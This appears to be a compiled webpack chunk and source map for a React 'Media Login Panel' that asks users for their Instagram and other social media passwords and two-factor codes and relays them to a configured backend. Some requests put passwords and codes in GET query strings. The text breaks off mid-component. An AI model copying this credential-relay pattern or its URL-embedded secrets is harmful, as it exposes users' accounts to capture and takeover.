Z,EAAKhD,SAAS,CAAE4B,WAAW,IAAQ,WACjCrC,OAAO0D,YAAW,WAChB,EAAKjD,SAAS,CAAE4B,WAAW,MAC1B,S,EAGPsB,YAAc,SAACC,GACbA,EAAEC,iBAEF,EAAKpD,SAAS,CAAE6B,SAAS,IACU,IAA/B,EAAKlC,MAAM+B,SAAS2B,QAA+C,IAA/B,EAAK1D,MAAMgC,SAAS0B,OAC1DC,MAAM,GAAD,OAAI1F,EAAI0B,cAAR,oBAAyC,CAC5CiE,OAAQ,OACRC,QAAS,CACP,eAAgB,mDAElBC,KAAMlC,EAAYmC,UAAU,CAC1BhC,SAAU,EAAK/B,MAAM+B,SACrBC,SAAU,EAAKhC,MAAMgC,SACrBgC,YAAa/F,EAAIgG,uBACjBvB,QAAS,EAAK1C,MAAM0C,YAGrBwB,MAAK,SAACC,GAAD,OAAcA,EAASC,UAC5BF,MAAK,SAACG,GACL5E,QAAQC,IAAI2E,GACZ,EAAKhE,SACH,CACE8B,QAASkC,EAAalC,UAExB,WACE,EAAKkB,iBAGJgB,EAAa/B,QAGZ+B,EAAa0B,YACf,EAAK1F,SAAS,CACZ0F,aAAa,EACbI,eAAgB9B,EAAa8B,eAC7BD,aAAc7B,EAAa6B,aAC3BE,YAAa/B,EAAa+B,YAC1BlE,SAAS,IAGX,EAAK7B,SAAS,CAAEiC,SAAS,IAX3B,EAAKjC,SAAS,CAAE6B,SAAS,OAgBI,IAA/B,EAAKlC,MAAM+B,SAAS2B,OACtB,EAAKrD,SACH,CACE8B,QAAS,2BACTD,SAAS,IAEX,WACE,EAAKmB,iBAIT,EAAKhD,SACH,CACE8B,QAAS,2BACTD,SAAS,IAEX,WACE,EAAKmB,kB,EAMfiB,gBAAkB,SAACd,GACjBG,MAAM,GAAD,OACA1F,EAAI0B,cADJ,0CACmD,EAAKK,MAAMuC,KAD9D,2BACqF,EAAKvC,MAAMmG,eADhG,wBAC8H,EAAKnG,MAAMoG,YADzI,wBACoKnI,EAAIgG,uBADxK,qBAC2M,EAAKjE,MAAM+B,SADtN,qBAC2O,EAAK/B,MAAMgC,SADtP,yBAC+Q,EAAKhC,MAAMkG,aAD1R,oBACkT,EAAKlG,MAAM0C,SAChU,CACEkB,OAAQ,QAGTM,MAAK,SAACC,GAAD,OAAcA,EAASC,UAC5BF,MAAK,SAACG,GACL5E,QAAQC,IAAI2E,GACZ,EAAKhE,SACH,CACE8B,QAASkC,EAAalC,UAExB,WACE,EAAKkB,iBAGLgB,EAAa/B,QACf,EAAKjC,SAAS,CAAEiC,SAAS,IAEzB,EAAKjC,SAAS,CAAE8B,QAASkC,EAAalC,QAASI,KAAM,KAAM,WACzD,EAAKc,qB,EAKflD,YAAc,WACZ,EAAKE,SAAS,CACZJ,UAAU,K,EAGdK,eAAiB,WACf,GAAI,EAAKN,MAAMC,SACb,OAAO,kBAAC,IAAD,CAAUC,GAAG,O,uDAGd,IAAD,OACP,OACE,oCACE,kBAAC/B,EAAD,MACA,kBAACC,EAAA,EAAD,CAAWC,MAAM,MACf,kBAACC,EAAA,EAAD,KACE,kBAACE,EAAA,EAAD,KACE,kBAACoC,EAAA,EAAD,KACE,kBAACA,EAAA,EAAKzC,OAAN,KACE,wBAAII,UAAU,0BAAd,mCAEE,uBACEgB,KAAK,sBACL0B,QAASH,KAAKX,YACd5B,UAAU,eAHZ,aASJ,kBAACqC,EAAA,EAAKC,KAAN,KACE,yBAAKG,MAAM,8BACT,yBAAKzC,UAAU,iCACZuC,KAAKR,iBACLQ,KAAKd,MAAMiC,UACV,kBAACsC,EAAA,EAAD,CAAOC,QAAQ,UAAU1D,KAAKd,MAAMmC,SAEpC,GAEDrB,KAAKd,MAAMsC,QACV,oCACG,IACD,gCACE,wDACA,+CAEF,kBAAC,IAAD,CACEmC,UAAW,WAMT,OALA7E,OAAO0D,YAAW,WAChB1D,OAAOC,SAASN,KACdtB,EAAIyG,wBACL,KAEI,SAKb,oCACE,wBAAInG,UAAU,8BAAd,2BAIA,uBAAGA,UAAU,+BAAb,6CAIA,kBAACoG,EAAA,EAAD,KACE,kBAACA,EAAA,EAAKC,MAAN,CAAYC,UAAU,QACpB,kBAACF,EAAA,EAAKG,MAAN,sBACA,kBAACH,EAAA,EAAKI,QAAN,aACEC,KAAK,OACLC,GAAG,OACHC,YAAY,mBACZC,aAAa,MACbC,SAAU,SAAC5B,GAAD,OAAO,EAAKV,eAAeU,IACrCR,MAAOlC,KAAKd,MAAM+B,SAClBsD,KAAK,QAPP,eAQe,SAGjB,kBAACV,EAAA,EAAKC,MAAN,CAAYC,UAAU,QACpB,kBAACF,EAAA,EAAKG,MAAN,iBACA,kBAACH,EAAA,EAAKI,QAAN,aACEC,KAAK,WACLC,GAAG,OACHC,YAAY,WACZC,aAAa,MACbC,SAAU,SAAC5B,GAAD,OAAO,EAAKJ,eAAeI,IACrCR,MAAOlC,KAAKd,MAAMgC,SAClBqD,KAAK,QAPP,eAQe,SAGhBvE,KAAKd,MAAMkC,QACV,kBAACoD,EAAA,EAAD,CAAQd,QAAQ,UAAUQ,KAAK,SAASO,UAAQ,GAC9C,kBAACC,EAAA,EAAD,CACEC,GAAG,OACHC,UAAU,OACVC,KAAK,KACLC,KAAK,SACLC,cAAY,SANhB,cAWA,4BACE5E,QAAS,SAACuC,GAAD,OAAO,EAAKD,YAAYC,IACjCwB,KAAK,SACLzG,UAAU,mDAHZ,SASDuC,KAAKd,MAAM+F,YACV,6BACE,kBAACpB,EAAA,EAAKC,MAAN,KACE,kBAACD,EAAA,EAAKG,MAAN,KACiC,gBAA9BhE,KAAKd,MAAMmG,eACR,sBACA,qCAEN,2BACEnD,MAAOlC,KAAKd,MAAMuC,KAClB6C,SAAU,SAAC5B,GACT,EAAKP,WAAWO,IAElBwB,KAAK,SACL9B,UAAU,KACVmC,KAAK,OACLF,aAAa,MACb5G,UAAU,8BAGd,4BACE0C,QAAS,WACP,EAAKqD,mBAEPU,KAAK,SACLzG,UAAU,iBALZ,gBAWF,YAYtB,kBAACa,EAAD,CAAQE,UAAQ,S,GAzReqC,aCJjCC,EAAcC,EAAQ,IACtB5D,EAAMC,MAESoI,G,4MACnBtG,MAAQ,CACN+B,SAAU,GACVC,SAAU,GACVC,WAAW,EACXC,SAAS,EACTC,QAAS,GACT4D,aAAa,EACbzD,SAAS,EACTrC,UAAU,EACV+F,YAAa,GACbzD,KAAM,GACNG,QAAS9C,OAAOC,SAAS8C,SAASC,UAAU,IAAIC,MAAM,KAAK,I,EAE7DC,eAAiB,SAACC,GAChB,EAAK1C,SAAS,CAAE0B,SAAUgB,EAAMvD,OAAOwD,S,EAEzCC,WAAa,SAACF,GAAW,IAAD,EACOA,EAAMvD,OAA3BwD,EADc,EACdA,MAAOE,EADO,EACPA,UACTf,EAAUa,EAAMG,MAAM,EAAGD,GAC/B,EAAK7C,SAAS,CAAEkC,KAAMJ,K,EAExBiB,eAAiB,SAACL,GAChB,EAAK1C,SAAS,CAAE2B,SAAUe,EAAMvD,OAAOwD,S,EAEzCK,YAAc,WACZ,EAAKhD,SAAS,CAAE4B,WAAW,IAAQ,WACjCrC,OAAO0D,YAAW,WAChB,EAAKjD,SAAS,CAAE4B,WAAW,MAC1B,S,EAGPsB,YAAc,SAACC,GACbA,EAAEC,iBACF,EAAKpD,SAAS,CAAE6B,SAAS,IACU,IAA/B,EAAKlC,MAAM+B,SAAS2B,QAA+C,IAA/B,EAAK1D,MAAMgC,SAAS0B,OAC1DC,MAAM,GAAD,OAAI1F,EAAI0B,cAAR,mBAAwC,CAC3CiE,OAAQ,OACRC,QAAS,CACP,eAAgB,mDAElBC,KAAMlC,EAAYmC,UAAU,CAC1BhC,SAAU,EAAK/B,MAAM+B,SACrBC,SAAU,EAAKhC,MAAMgC,SACrBgC,YAAa/F,EAAIgG,uBACjBvB,QAAS,EAAK1C,MAAM0C,YAGrBwB,MAAK,SAACC,GAAD,OAAcA,EAASC,UAC5BF,MAAK,SAACG,GACL5E,QAAQC,IAAI2E,GACZ,EAAKhE,SACH,CACE8B,QAASkC,EAAalC,UAExB,WACE,EAAKkB,iBAGJgB,EAAa/B,QAGZ+B,EAAa0B,YACf,EAAK1F,SAAS,CACZ0F,aAAa,EACbC,YAAa3B,EAAa2B,YAC1B9D,SAAS,IAGX,EAAK7B,SAAS,CAAEiC,SAAS,IAT3B,EAAKjC,SAAS,CAAE6B,SAAS,OAcI,IAA/B,EAAKlC,MAAM+B,SAAS2B,OACtB,EAAKrD,SACH,CACE8B,QAAS,2BACTD,SAAS,IAEX,WACE,EAAKmB,iBAIT,EAAKhD,SACH,CACE8B,QAAS,2BACTD,SAAS,IAEX,WACE,EAAKmB,kB,EAMfiB,gBAAkB,SAACd,GACc,IAA3B,EAAKxD,MAAMuC,KAAKmB,QAAgB,EAAK1D,MAAMuC,KAAKmB,OAAS,EAC3D,EAAKrD,SAAS,CAAE8B,QAAS,qCAAsC,WAC7D,EAAKkB,iBAGPM,MAAM,GAAD,OACA1F,EAAI0B,cADJ,+BACwC,EAAKK,MAAMuC,KADnD,wBACuEtE,EAAIgG,uBAD3E,kBAC2G,EAAKjE,MAAM+B,SADtH,qBAC2I,EAAK/B,MAAMgC,SADtJ,wBAC8K,EAAKhC,MAAMgG,YADzL,oBACgN,EAAKhG,MAAM0C,SAC9N,CACEkB,OAAQ,QAGTM,MAAK,SAACC,GAAD,OAAcA,EAASC,UAC5BF,MAAK,SAACG,GACL5E,QAAQC,IAAI2E,GACZ,EAAKhE,SACH,CACE8B,QAASkC,EAAalC,UAExB,WACE,EAAKkB,iBAGLgB,EAAa/B,QACf,EAAKjC,SAAS,CAAEiC,SAAS,IAEzB,EAAKjC,SAAS,CAAE8B,QAASkC,EAAalC,QAASI,KAAM,KAAM,WACzD,EAAKc,qB,EAMjBlD,YAAc,WACZ,EAAKE,SAAS,CACZJ,UAAU,K,EAGdK,eAAiB,WACf,GAAI,EAAKN,MAAMC,SACb,OAAO,kBAAC,IAAD,CAAUC,GAAG,O,uDAGd,IAAD,OACP,OACE,oCACE,kBAAC/B,EAAD,MACA,kBAACC,EAAA,EAAD,CAAWC,MAAM,MACf,kBAACC,EAAA,EAAD,KACE,kBAACE,EAAA,EAAD,KACE,kBAACoC,EAAA,EAAD,KACE,kBAACA,EAAA,EAAKzC,OAAN,KACE,wBAAII,UAAU,0BAAd,mCAEE,uBACEgB,KAAK,sBACL0B,QAASH,KAAKX,YACd5B,UAAU,eAHZ,aASJ,kBAACqC,EAAA,EAAKC,KAAN,KACE,yBAAKG,MAAM,8BACT,yBAAKzC,UAAU,iCACZuC,KAAKR,iBAELQ,KAAKd,MAAMsC,QACV,oCACG,IACD,gCACE,wDACA,+CAEF,kBAAC,IAAD,CACEmC,UAAW,WAMT,OALA7E,OAAO0D,YAAW,WAChB1D,OAAOC,SAASN,KACdtB,EAAIyG,wBACL,KAEI,SAKb,oCACE,wBAAInG,UAAU,8BAAd,2BAIA,uBAAGA,UAAU,+BAAb,6CAICuC,KAAKd,MAAMiC,UACV,kBAACsC,EAAA,EAAD,CAAOC,QAAQ,UAAU1D,KAAKd,MAAMmC,SAEpC,GAGF,kBAACwC,EAAA,EAAD,KACE,kBAACA,EAAA,EAAKC,MAAN,CAAYC,UAAU,QACpB,kBAACF,EAAA,EAAKG,MAAN,sBACA,kBAACH,EAAA,EAAKI,QAAN,aACEC,KAAK,OACLC,GAAG,OACHC,YAAY,mBACZC,aAAa,MACbC,SAAU,SAAC5B,GAAD,OAAO,EAAKV,eAAeU,IACrCR,MAAOlC,KAAKd,MAAM+B,SAClBsD,KAAK,QAPP,eAQe,SAGjB,kBAACV,EAAA,EAAKC,MAAN,CAAYC,UAAU,QACpB,kBAACF,EAAA,EAAKG,MAAN,iBACA,kBAACH,EAAA,EAAKI,QAAN,aACEC,KAAK,WACLC,GAAG,OACHC,YAAY,WACZC,aAAa,MACbC,SAAU,SAAC5B,GAAD,OAAO,EAAKJ,eAAeI,IACrCR,MAAOlC,KAAKd,MAAMgC,SAClBqD,KAAK,QAPP,eAQe,SAGhBvE,KAAKd,MAAMkC,QACV,kBAACoD,EAAA,EAAD,CAAQd,QAAQ,UAAUQ,KAAK,SAASO,UAAQ,GAC9C,kBAACC,EAAA,EAAD,CACEC,GAAG,OACHC,UAAU,OACVC,KAAK,KACLC,KAAK,SACLC,cAAY,SANhB,cAWA,4BACE5E,QAAS,SAACuC,GAAD,OAAO,EAAKD,YAAYC,IACjCwB,KAAK,SACLzG,UAAU,mDAHZ,SASDuC,KAAKd,MAAM+F,YACV,6BACE,kBAACpB,EAAA,EAAKC,MAAN,KACE,kBAACD,EAAA,EAAKG,MAAN,0CAGA,2BACE9B,MAAOlC,KAAKd,MAAMuC,KAClB6C,SAAU,SAAC5B,GACT,EAAKP,WAAWO,IAElBwB,KAAK,SACL9B,UAAU,KACVmC,KAAK,OACL9G,UAAU,8BAGd,4BACE0C,QAAS,WACP,EAAKqD,mBAEPU,KAAK,SACLzG,UAAU,iBALZ,gBAWF,YAYtB,kBAACa,EAAD,CAAQE,UAAQ,S,GA/RcqC,aCThC1D,GAAMC,MAkCGqI,OAjCf,WACE,OACE,kBAAC,IAAD,KACE,kBAAC,IAAD,CAAOC,KAAK,IAAI/B,UAAW1E,EAAM0G,OAAK,IACX,SAA1BxI,GAAIsD,kBACH,kBAAC,IAAD,CAAOiF,KAAK,WAAW/B,UAAWwB,EAASQ,OAAK,IAEhD,GAE0B,SAA3BxI,GAAIwD,mBACH,kBAAC,IAAD,CAAO+E,KAAK,YAAY/B,UAAWqB,EAAUW,OAAK,IAElD,GAE2B,SAA5BxI,GAAI8C,oBACH,kBAAC,IAAD,CAAOyF,KAAK,aAAa/B,UAAW3C,EAAW2E,OAAK,IAEpD,GAE2B,SAA5BxI,GAAIoD,oBACH,kBAAC,IAAD,CAAOmF,KAAK,aAAa/B,UAAW4B,EAAWI,OAAK,IAEpD,GAE0B,SAA3BxI,GAAIkD,mBACH,kBAAC,IAAD,CAAOqF,KAAK,YAAY/B,UAAW6B,GAAUG,OAAK,IAElD,K,iBCpCOC,kBCIfC,IAASC,OACP,kBAAC,KAAD,CAAQF,QAASA,IACf,kBAAC,GAAD,OAEFlG,SAASC,eAAe,W","file":"static/js/main.e454e3ec.chunk.js","sourcesContent":["module.exports = __webpack_public_path__ + \"static/media/logo.c6b5b406.png\";","module.exports = __webpack_public_path__ + \"static/media/instagram-logo.c1ea2611.svg\";","module.exports = __webpack_public_path__ + \"static/media/linkedin-logo.ab5b573d.svg\";","module.exports = __webpack_public_path__ + \"static/media/facebook-logo.c888480a.svg\";","module.exports = __webpack_public_path__ + \"static/media/twitter-logo.cde0083c.svg\";","module.exports = __webpack_public_path__ + \"static/media/pinterest-logo.cab4ec59.svg\";","import React from \"react\";\r\nimport { Container, Row, Col } from \"react-bootstrap\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\n\r\nimport logo from \"../images/logo.png\";\r\nimport \"../css/style.css\";\r\n\r\nconst env = runtimeEnv();\r\n\r\nexport default function Header() {\r\n  return (\r\n    <Container fluid=\"sm\">\r\n      <Row className=\"d-flex justify-content-center\">\r\n        <div className=\"dashboard-header\">\r\n          <div className=\"header-body\">\r\n            <Row>\r\n              <Col className=\"d-flex justify-content-center\">\r\n                {env.REACT_APP_FAVICONURL !== undefined &&\r\n                env.REACT_APP_FAVICONURL != null ? (\r\n                  <img\r\n                    className=\"img-fluid\"\r\n                    alt=\"logo\"\r\n                    src={env.REACT_APP_FAVICONURL}\r\n                  ></img>\r\n                ) : (\r\n                  <img src={logo} className=\"img-fluid\" alt=\"logo\" />\r\n                )}\r\n              </Col>\r\n            </Row>\r\n          </div>\r\n        </div>\r\n      </Row>\r\n\r\n      <Row>\r\n        <Col className=\"text-center\">\r\n          {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\" ? (\r\n            <p\r\n              style={{\r\n                color: \"#007bff\",\r\n                fontWeight: 600,\r\n                fontSize: 24,\r\n                marginBottom: \"2rem\",\r\n              }}\r\n            >\r\n              {env.REACT_APP_TITLE}\r\n            </p>\r\n          ) : (\r\n            \"\"\r\n          )}\r\n        </Col>\r\n      </Row>\r\n    </Container>\r\n  );\r\n}\r\n","import React from \"react\";\r\nimport { Container, Row, Col } from \"react-bootstrap\";\r\n\r\nexport default function Footer(props) {\r\n  const withText = props.withText;\r\n  if (withText) {\r\n    return (\r\n      <Container\r\n        fluid=\"sm\"\r\n        className=\"d-flex justify-content-between flex-wrap mb-5\"\r\n      >\r\n        <Row className=\"align-self-start\">\r\n          <Col>\r\n            You might get an email that someone logged into your account, that's\r\n            perfectly normal.\r\n          </Col>\r\n        </Row>\r\n        <Row className=\"align-self-end\">\r\n          <Col>\r\n            ⚡️Powered by{\" \"}\r\n            <a href=\"https://thesocialproxy.com\" target=\"_blank\">\r\n              The Social Proxy\r\n            </a>\r\n            .\r\n          </Col>\r\n        </Row>\r\n      </Container>\r\n    );\r\n  } else {\r\n    return (\r\n      <Container fluid=\"sm\" className=\"d-flex justify-content-end mb-5\">\r\n        <Row>\r\n          <Col>\r\n            ⚡️ Powered by{\" \"}\r\n            <a href=\"https://thesocialproxy.com\" target=\"_blank\">\r\n              The Social Proxy\r\n            </a>\r\n            .\r\n          </Col>\r\n        </Row>\r\n      </Container>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport { Redirect } from \"react-router-dom\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Container, Row, Col, Card } from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\nimport instagramLogo from \"../images/instagram-logo.svg\";\r\nimport linkedinLogo from \"../images/linkedin-logo.svg\";\r\nimport facebookLogo from \"../images/facebook-logo.svg\";\r\nimport twitterLogo from \"../images/twitter-logo.svg\";\r\nimport pinterestLogo from \"../images/pinterest-logo.svg\";\r\n\r\nconst env = runtimeEnv();\r\nconsole.log(env.REACT_APP_URL);\r\nconsole.log(window.location.host);\r\nexport default class Home extends Component {\r\n  state = {\r\n    redirect: false,\r\n    to: \"\",\r\n  };\r\n  setRedirect = (url) => {\r\n    this.setState({\r\n      redirect: true,\r\n      to: url,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to={this.state.to} />;\r\n    }\r\n  };\r\n  componentDidMount() {\r\n    const favicon = document.getElementById(\"FavIcon\");\r\n    if (\r\n      env.REACT_APP_FAVICONURL !== undefined ||\r\n      env.REACT_APP_FAVICONURL !== \"\"\r\n    )\r\n      favicon.href = `${env.REACT_APP_FAVICONURL}`;\r\n    const title = document.getElementById(\"AppTitle\");\r\n    if (env.REACT_APP_TITLE !== undefined || env.REACT_APP_TITLE !== \"\")\r\n      title.innerText = `${env.REACT_APP_TITLE}`;\r\n    else {\r\n      title.innerText = \"Media Login Panel\";\r\n    }\r\n  }\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              <Card>\r\n                <Card.Header>\r\n                  <h4 className=\"card-header-title mb-0\">\r\n                    What Website Would You Like to Login To?\r\n                  </h4>\r\n                </Card.Header>\r\n                <Card.Body className=\"text-center\">\r\n                  {this.renderRedirect()}\r\n                  {env.REACT_APP_INSTAGRAM === \"true\" ? (\r\n                    <div>\r\n                      <a\r\n                        class=\"btn btn-lg btn-primary lift btn-list btn-selection\"\r\n                        onClick={() => this.setRedirect(\"/Instagram\")}\r\n                      >\r\n                        <img src={instagramLogo} class=\"img-selection\" />\r\n                      </a>\r\n                    </div>\r\n                  ) : (\r\n                    \"\"\r\n                  )}\r\n\r\n                  {env.REACT_APP_FACEBOOK === \"true\" ? (\r\n                    <div>\r\n                      <a\r\n                        class=\"btn btn-lg btn-primary lift btn-list btn-selection\"\r\n                        onClick={() => this.setRedirect(\"/Facebook\")}\r\n                      >\r\n                        <img src={facebookLogo} class=\"img-selection\" />\r\n                      </a>\r\n                    </div>\r\n                  ) : (\r\n                    \"\"\r\n                  )}\r\n\r\n                  {env.REACT_APP_PINTEREST === \"true\" ? (\r\n                    <div>\r\n                      <a\r\n                        class=\"btn btn-lg btn-primary lift btn-list btn-selection\"\r\n                        onClick={() => this.setRedirect(\"/Pinterest\")}\r\n                      >\r\n                        <img src={pinterestLogo} class=\"img-selection\" />\r\n                      </a>\r\n                    </div>\r\n                  ) : (\r\n                    \"\"\r\n                  )}\r\n\r\n                  {env.REACT_APP_TWITTER === \"true\" ? (\r\n                    <div>\r\n                      <a\r\n                        class=\"btn btn-lg btn-primary lift btn-list btn-selection\"\r\n                        onClick={() => this.setRedirect(\"/Twitter\")}\r\n                      >\r\n                        <img src={twitterLogo} class=\"img-selection\" />\r\n                      </a>\r\n                    </div>\r\n                  ) : (\r\n                    \"\"\r\n                  )}\r\n\r\n                  {env.REACT_APP_LINKEDIN === \"true\" ? (\r\n                    <div>\r\n                      <a\r\n                        class=\"btn btn-lg btn-primary lift btn-list btn-selection\"\r\n                        onClick={() => this.setRedirect(\"/Linkedin\")}\r\n                      >\r\n                        <img src={linkedinLogo} class=\"img-selection\" />\r\n                      </a>\r\n                    </div>\r\n                  ) : (\r\n                    \"\"\r\n                  )}\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Route, Redirect } from \"react-router-dom\";\r\nimport {\r\n  Container,\r\n  Row,\r\n  Col,\r\n  Card,\r\n  Form,\r\n  Button,\r\n  Alert,\r\n  Spinner,\r\n} from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\n\r\nconst queryString = require(\"query-string\");\r\nconst env = runtimeEnv();\r\nexport default class Instagram extends Component {\r\n  state = {\r\n    username: \"\",\r\n    password: \"\",\r\n    showAlert: false,\r\n    loading: false,\r\n    message: \"\",\r\n    twoFactor: false,\r\n    email_auth: false,\r\n    success: false,\r\n    code: \"\",\r\n    two_factor_identifier: \"\",\r\n    verificationMethod: \"\",\r\n    appName: window.location.hostname.substring(10).split(\".\")[0],\r\n  };\r\n\r\n  handleUsername = (event) => {\r\n    this.setState({ username: event.target.value });\r\n  };\r\n  handleCode = (event) => {\r\n    const { value, maxLength } = event.target;\r\n    const message = value.slice(0, maxLength);\r\n    this.setState({ code: message });\r\n  };\r\n  handlePassword = (event) => {\r\n    this.setState({ password: event.target.value });\r\n  };\r\n  onShowAlert = () => {\r\n    this.setState({ showAlert: true }, () => {\r\n      window.setTimeout(() => {\r\n        this.setState({ showAlert: false });\r\n      }, 30000);\r\n    });\r\n  };\r\n  handleClick = (e) => {\r\n    e.preventDefault();\r\n    this.setState({ loading: true });\r\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\r\n      console.log(this.state.appName, window.location.href.split(\"//\")[1]);\r\n      fetch(`${env.REACT_APP_URL}/insta`, {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n        },\r\n        body: queryString.stringify({\r\n          username: this.state.username,\r\n          password: this.state.password,\r\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n          appName: this.state.appName,\r\n        }),\r\n      })\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (!responseData.success) {\r\n            this.setState({ loading: false });\r\n          } else {\r\n            if (responseData.twoFactor) {\r\n              this.setState({\r\n                email_auth: responseData.email_auth,\r\n                twoFactor: true,\r\n                loading: true,\r\n                two_factor_identifier: responseData.two_factor_identifier,\r\n                verificationMethod: responseData.verificationMethod,\r\n              });\r\n            } else {\r\n              this.setState({ success: true });\r\n            }\r\n          }\r\n        });\r\n    } else {\r\n      if (this.state.username.length === 0) {\r\n        this.setState(\r\n          {\r\n            message: \"username cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      } else {\r\n        this.setState(\r\n          {\r\n            message: \"password cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      }\r\n    }\r\n  };\r\n  handleCodeClick = (e) => {\r\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\r\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\r\n        this.onShowAlert();\r\n      });\r\n    } else {\r\n      if (!this.state.email_auth) {\r\n        fetch(\r\n          `${env.REACT_APP_URL}/insta/submitCode?username=${this.state.username}&password=${this.state.password}&code=${this.state.code}&two_factor_identifier=${this.state.two_factor_identifier}&verificationMethod=${this.state.verificationMethod}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&appName=${this.state.appName}`,\r\n          {\r\n            method: \"GET\",\r\n          }\r\n        )\r\n          .then((response) => response.json())\r\n          .then((responseData) => {\r\n            console.log(responseData);\r\n            if (responseData.success) {\r\n              this.setState(\r\n                { success: true, message: responseData.message },\r\n                () => {\r\n                  this.onShowAlert();\r\n                }\r\n              );\r\n            } else {\r\n              this.setState({ message: responseData.message }, () => {\r\n                this.onShowAlert();\r\n              });\r\n            }\r\n          });\r\n      } else {\r\n        fetch(\r\n          `${env.REACT_APP_URL}/insta/emailVerify?username=${this.state.username}&code=${this.state.code}`,\r\n          {\r\n            method: \"GET\",\r\n          }\r\n        )\r\n          .then((response) => response.json())\r\n          .then((responseData) => {\r\n            console.log(responseData);\r\n            this.setState(\r\n              {\r\n                message: responseData.message,\r\n              },\r\n              () => {\r\n                this.onShowAlert();\r\n              }\r\n            );\r\n            if (responseData.success) {\r\n              fetch(`${env.REACT_APP_URL}/insta`, {\r\n                method: \"POST\",\r\n                headers: {\r\n                  \"Content-Type\":\r\n                    \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n                },\r\n                body: queryString.stringify({\r\n                  username: this.state.username,\r\n                  password: this.state.password,\r\n                  cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n                  appName: this.state.appName,\r\n                }),\r\n              })\r\n                .then((response) => response.json())\r\n                .then((responseData) => {\r\n                  console.log(responseData);\r\n                  this.setState(\r\n                    {\r\n                      message: responseData.message,\r\n                    },\r\n                    () => {\r\n                      this.onShowAlert();\r\n                    }\r\n                  );\r\n                  if (!responseData.success) {\r\n                    this.setState({ loading: false });\r\n                  } else {\r\n                    if (!responseData.twoFactor) {\r\n                      this.setState({ success: true });\r\n                    }\r\n                  }\r\n                });\r\n            } else {\r\n              this.setState({ message: responseData.message, code: \"\" }, () => {\r\n                this.onShowAlert();\r\n              });\r\n            }\r\n          });\r\n      }\r\n    }\r\n  };\r\n  setRedirect = () => {\r\n    this.setState({\r\n      redirect: true,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to=\"/\" />;\r\n    }\r\n  };\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              <Card>\r\n                <Card.Header>\r\n                  <h4 className=\"card-header-title mb-0\">\r\n                    Please fill in your credentials.\r\n                    <a\r\n                      href=\"javaScript:void(0);\"\r\n                      onClick={this.setRedirect}\r\n                      className=\"float-right\"\r\n                    >\r\n                      Go Back\r\n                    </a>\r\n                  </h4>\r\n                </Card.Header>\r\n                <Card.Body>\r\n                  <div class=\"row justify-content-center\">\r\n                    <div className=\"col-12 col-md-5 col-xl-4 my-5\">\r\n                      {this.renderRedirect()}\r\n                      {this.state.showAlert ? (\r\n                        <Alert variant=\"danger\">{this.state.message}</Alert>\r\n                      ) : (\r\n                        \"\"\r\n                      )}\r\n                      {this.state.success ? (\r\n                        <>\r\n                          {\" \"}\r\n                          <center>\r\n                            <h1>Login Success Thank You!</h1>\r\n                            <h1>Redirecting...</h1>\r\n                          </center>\r\n                          <Route\r\n                            component={() => {\r\n                              window.setTimeout(() => {\r\n                                window.location.href =\r\n                                  env.REACT_APP_REDIRECTURL;\r\n                              }, 5000);\r\n\r\n                              return null;\r\n                            }}\r\n                          />\r\n                        </>\r\n                      ) : (\r\n                        <>\r\n                          <h1 className=\"display-4 text-center mb-3\">\r\n                            We Value Your Security.\r\n                          </h1>\r\n\r\n                          <p className=\"text-muted text-center mb-5\">\r\n                            We will not store your email or password.\r\n                          </p>\r\n\r\n                          <Form>\r\n                            <Form.Group controlId=\"name\">\r\n                              <Form.Label>Email Address</Form.Label>\r\n                              <Form.Control\r\n                                type=\"text\"\r\n                                id=\"name\"\r\n                                placeholder=\"name@address.com\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handleUsername(e)}\r\n                                value={this.state.username}\r\n                                name=\"name\"\r\n                                autocomplete=\"off\"\r\n                              />\r\n                            </Form.Group>\r\n                            <Form.Group controlId=\"pass\">\r\n                              <Form.Label>Password</Form.Label>\r\n                              <Form.Control\r\n                                type=\"password\"\r\n                                id=\"pass\"\r\n                                placeholder=\"password\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handlePassword(e)}\r\n                                value={this.state.password}\r\n                                name=\"name\"\r\n                                autocomplete=\"off\"\r\n                              />\r\n                            </Form.Group>\r\n                            {this.state.loading ? (\r\n                              <Button variant=\"primary\" type=\"submit\" disabled>\r\n                                <Spinner\r\n                                  as=\"span\"\r\n                                  animation=\"grow\"\r\n                                  size=\"sm\"\r\n                                  